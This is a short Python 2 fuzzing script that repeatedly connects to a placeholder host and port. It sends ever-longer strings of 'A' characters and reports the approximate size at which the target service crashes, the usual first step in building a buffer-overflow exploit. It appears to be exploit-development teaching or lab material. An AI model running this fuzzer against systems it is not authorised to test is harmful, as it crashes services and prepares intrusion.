#!/usr/bin/python

import sys, socket
from time import sleep

rhost = "0.0.0.0"
rport = 1234

junk = "A" * 100

while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((rhost,rport))
		print "Sending: %s bytes" % str(len(junk))
		s.send(junk)
		s.close()
		sleep(3)
		junk += "A" * 100
	except:
		print "Crashed around %s bytes" % str(len(junk))
		sys.exit()
